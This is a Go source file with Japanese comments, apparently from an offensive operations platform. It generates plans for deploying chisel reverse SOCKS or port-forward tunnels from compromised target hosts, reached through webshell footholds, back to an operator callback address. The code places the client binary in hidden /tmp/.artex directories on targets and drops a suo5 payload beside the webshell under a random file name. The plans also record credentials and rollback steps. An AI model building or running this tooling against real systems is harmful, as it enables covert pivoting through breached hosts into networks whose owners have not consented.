// plan.go はトンネルのデプロイ計画を生成する（4 点セットの plan）。計画が永続化の単位：Plan を丸ごと
// tunnels.deploy_params にシリアライズし、切断時の再起動ではデシリアライズ後にそのまま再 Deploy でき、パラメータを一切失わない。
//
// auth のトレードオフ：auth token は crypto/rand の 16 バイトで、deploy_params とプラットフォーム側の
// --authfile（0600）にのみ保存し、プラットフォームの server プロセスのコマンドラインには出さない（ps から見えない）。ターゲット側の client
// には AUTH 環境変数で渡す（chisel client は --auth 未指定時に AUTH env を読む。https://github.com/jpillora/chisel README 参照）。ps cmdline には出ない；残る露出面は
// ターゲット機の /proc/<pid>/environ が同一 uid から読めること——ターゲットは既にフットホールドなので許容し、ここに注記する。
package tunnel

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strconv"
)

// Plan は完全なデプロイ計画 = deploy_params の永続化内容。すべてのプロセス台帳（server_pid/
// remote_pid/stage_token/リモートパス）もここに書き戻し、管理対象リソースの原則を満たす。
type Plan struct {
	Kind         string   `json:"kind"`                 // socks | portfwd
	Adapter      string   `json:"adapter"`              // chisel
	TaskID       int64    `json:"task_id"`              // 所属タスク
	ViaSessionID int64    `json:"via_session_id"`       // どのフットホールド経由でデプロイするか
	ListenHost   string   `json:"listen_host"`          // プラットフォーム側 server のバインドアドレス
	ListenPort   int      `json:"listen_port"`          // プラットフォーム側 server のポート（ターゲットのコールバック口）
	SocksPort    int      `json:"socks_port,omitempty"` // socks：プラットフォームのループバック上の socks5 入口
	LocalPort    int      `json:"local_port,omitempty"` // portfwd：プラットフォームのループバック上の転送入口
	TargetHost   string   `json:"target_host,omitempty"`
	TargetPort   int      `json:"target_port,omitempty"`
	PlatformAddr string   `json:"platform_addr"` // ターゲットのコールバックアドレス host:port(callback host + listen port)
	AuthUser     string   `json:"auth_user"`
	AuthPass     string   `json:"auth_pass"`   // crypto/rand の 16 バイト hex；ここか authfile にしか置かず、コマンドラインには出さない
	AuthFile     string   `json:"auth_file"`   // プラットフォーム側 --authfile のパス（0600）
	ServerArgs   []string `json:"server_args"` // chisel server の引数（auth を含まない）
	ServerPID    int      `json:"server_pid,omitempty"`
	ServerLog    string   `json:"server_log"`
	RemoteDir    string   `json:"remote_dir"` // ターゲット側 /tmp/.artex-<rand>
	RemoteBin    string   `json:"remote_bin"`
	RemoteLog    string   `json:"remote_log"`
	RemotePID    int      `json:"remote_pid,omitempty"`
	StageToken   string   `json:"stage_token,omitempty"` // ワンタイム配信エントリ（使用後に削除）
	VerifyAddr   string   `json:"verify_addr,omitempty"` // 決定的検証の対象 host:port
	ClientArgs   []string `json:"client_args"`           // chisel client の引数（auth を含まない。auth は AUTH env で渡す）
	// suo5 アダプタのフィールド（omitempty。既存の chisel deploy_params との後方互換）：
	PayloadFile string `json:"payload_file,omitempty"` // プラットフォーム側 payloads ディレクトリ内のファイル名（suo5.php など）
	PayloadName string `json:"payload_name,omitempty"` // ターゲット側のランダムなファイル名
	PayloadPath string `json:"payload_path,omitempty"` // ターゲット側の完全な書き込みパス（webshell と同じディレクトリ）
	PayloadURL  string `json:"payload_url,omitempty"`  // suo5 -t のターゲット URL
}

// PlanOpts は計画生成の入力。ポート割り当てに必要な占有集合とバインド検査は呼び出し側が注入し、
// 本パッケージの組み立てロジックは純粋関数のままテスト可能に保つ。
type PlanOpts struct {
	TaskID       int64
	ViaSessionID int64
	ListenHost   string // 空 = 0.0.0.0
	CallbackHost string // ターゲットがプラットフォームへコールバックする際のホストアドレス（config.CallbackAddr の host 部分）
	TargetHost   string // portfwd では必須
	TargetPort   int    // portfwd では必須
	VerifyAddr   string // socks の決定的検証対象（通常はフットホールド webshell の host:port）
	PortMin      int
	PortMax      int
	UsedPorts    map[int]bool        // 使用中ポート（稼働中トンネルの台帳）
	CanListen    func(port int) bool // 実際にバインドできるかの検査。nil ならスキップ
	DataDir      string              // プラットフォーム側のトンネル作業ディレクトリ（authfile/ログ）
}

// newAuth は auth 認証情報を生成する：user は固定で "artex"、pass は crypto/rand の 16 バイト hex。
func newAuth() (user, pass string, err error) {
	b := make([]byte, 16)
	if _, err = rand.Read(b); err != nil {
		return "", "", fmt.Errorf("auth token の生成に失敗しました: %w", err)
	}
	return "artex", hex.EncodeToString(b), nil
}

// randTag は 8 文字のランダムな接尾辞を生成する（リモートのディレクトリ/ファイル名）。
func randTag() (string, error) {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func (o *PlanOpts) base(kind string) (*Plan, error) {
	user, pass, err := newAuth()
	if err != nil {
		return nil, err
	}
	tag, err := randTag()
	if err != nil {
		return nil, err
	}
	listenHost := o.ListenHost
	if listenHost == "" {
		listenHost = "0.0.0.0"
	}
	listenPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	if o.UsedPorts == nil {
		o.UsedPorts = map[int]bool{}
	}
	o.UsedPorts[listenPort] = true // 同一計画内の再割り当てで衝突しない
	dir := o.DataDir               // プラットフォーム側のトンネル作業ディレクトリ（Manager.PlanDataDir。authfile/ログはここに置く）
	return &Plan{
		Kind:         kind,
		Adapter:      AdapterChisel,
		TaskID:       o.TaskID,
		ViaSessionID: o.ViaSessionID,
		ListenHost:   listenHost,
		ListenPort:   listenPort,
		PlatformAddr: net.JoinHostPort(o.CallbackHost, strconv.Itoa(listenPort)),
		AuthUser:     user,
		AuthPass:     pass,
		AuthFile:     dir + "/chisel-" + tag + ".authfile",
		ServerLog:    dir + "/chisel-" + tag + ".server.log",
		RemoteDir:    "/tmp/.artex-" + tag,
		RemoteBin:    "/tmp/.artex-" + tag + "/ch",
		RemoteLog:    "/tmp/.artex-" + tag + "/run.log",
		VerifyAddr:   o.VerifyAddr,
	}, nil
}

// assemble は server/client のコマンドラインを補完する。server は --authfile で認証し（auth は ps に出ない）、
// client は AUTH env で認証する（spawn 時に注入。deploy.go 参照）。ClientArgs も同様に auth を含まない。
func (p *Plan) assemble(remoteSpec string) {
	p.ServerArgs = []string{
		"server",
		"--host", p.ListenHost,
		"-p", strconv.Itoa(p.ListenPort),
		"--reverse",
		"--authfile", p.AuthFile,
	}
	p.ClientArgs = []string{
		"client",
		"--keepalive", "10s", // chisel のオプションは server/remote より前に置く必要がある——後ろに置くと remote として解析される
		// (実践の教訓：「Failed to decode remote '--keepalive': Missing ports」が報告され、クライアントが即終了する)
		"http://" + p.PlatformAddr,
		remoteSpec,
	}
}

// PlanSocks はリバース socks 計画を生成する：プラットフォームのループバック 127.0.0.1:SocksPort が socks5 入口で、
// 返却形式（socks5://127.0.0.1:port）はフェーズ 3b のタスク単位 proxyEnv がそのまま消費できる。
func PlanSocks(o *PlanOpts) (*Plan, error) {
	if o.CallbackHost == "" {
		return nil, fmt.Errorf("callback_host は必須です（ターゲットがプラットフォームへコールバックする際に使用。ARTEX_CALLBACK_ADDR を設定してください）")
	}
	p, err := o.base(KindSocks)
	if err != nil {
		return nil, err
	}
	socksPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	p.SocksPort = socksPort
	p.assemble("R:127.0.0.1:" + strconv.Itoa(socksPort) + ":socks")
	return p, nil
}

// PlanPortfwd はリバースの単一ポート転送計画を生成する：プラットフォームのループバック 127.0.0.1:LocalPort → ターゲット側の
// TargetHost:TargetPort。
func PlanPortfwd(o *PlanOpts) (*Plan, error) {
	if o.CallbackHost == "" {
		return nil, fmt.Errorf("callback_host は必須です（ターゲットがプラットフォームへコールバックする際に使用。ARTEX_CALLBACK_ADDR を設定してください）")
	}
	if o.TargetHost == "" || o.TargetPort <= 0 {
		return nil, fmt.Errorf("portfwd には target_host と target_port が必要です")
	}
	p, err := o.base(KindPortfwd)
	if err != nil {
		return nil, err
	}
	localPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	p.LocalPort = localPort
	p.TargetHost = o.TargetHost
	p.TargetPort = o.TargetPort
	p.assemble("R:127.0.0.1:" + strconv.Itoa(localPort) + ":" +
		net.JoinHostPort(o.TargetHost, strconv.Itoa(o.TargetPort)))
	return p, nil
}

// AuthfileContent は --authfile のファイル内容。chisel の authfile は JSON の users マッピング
// {"user:pass": ["許可する remote アドレスのパターン"]}——生の user:pass テキストではない
// （実践の教訓：v1.11 のサーバーは裸のテキストに Invalid JSON を返して即終了する）。
func (p *Plan) AuthfileContent() string {
	b, _ := json.Marshal(map[string][]string{
		p.AuthUser + ":" + p.AuthPass: {".*"},
	})
	return string(b) + "\n"
}

// RollbackStep は 1 層分のロールバック動作を表す。Deploy のいずれかの層が失敗したら、RollbackSteps が示す
// 順序（最も深い完了済み層から回収する）で段階的にロールバックし、孤立したプロセス/ファイル/台帳を残さない。
type RollbackStep struct {
	Layer  string `json:"layer"`  // remote_process/remote_files/server_process/stage_entry/authfile/ledger_row
	Action string `json:"action"` // kill/rm/delete
	Detail string `json:"detail"`
}

// RollbackSteps は完全なロールバック手順を返す（純粋関数。順序が契約：ターゲット側が先でプラットフォーム側が後、
// 台帳行は常に最後に削除する——再起動と監査の唯一の根拠だから）。実行時は失敗した層までで打ち切る。
func (p *Plan) RollbackSteps() []RollbackStep {
	return []RollbackStep{
		{Layer: "remote_process", Action: "kill", Detail: fmt.Sprintf("セッション経由でターゲット側の pid %d を kill（先に kill -0 を実行し、/proc/<pid>/cmdline に %s が含まれるか照合）", p.RemotePID, p.RemoteBin)},
		{Layer: "remote_files", Action: "rm", Detail: "セッション経由で rm -rf " + p.RemoteDir},
		{Layer: "server_process", Action: "kill", Detail: fmt.Sprintf("プラットフォーム側の chisel server pid %d を停止（コマンドラインに %s が含まれることを照合）", p.ServerPID, p.AuthFile)},
		{Layer: "stage_entry", Action: "delete", Detail: "stage 配信エントリを削除 token=" + p.StageToken},
		{Layer: "authfile", Action: "rm", Detail: "プラットフォーム側の authfile を削除 " + p.AuthFile},
		{Layer: "ledger_row", Action: "delete", Detail: "tunnels の台帳行を削除"},
	}
}
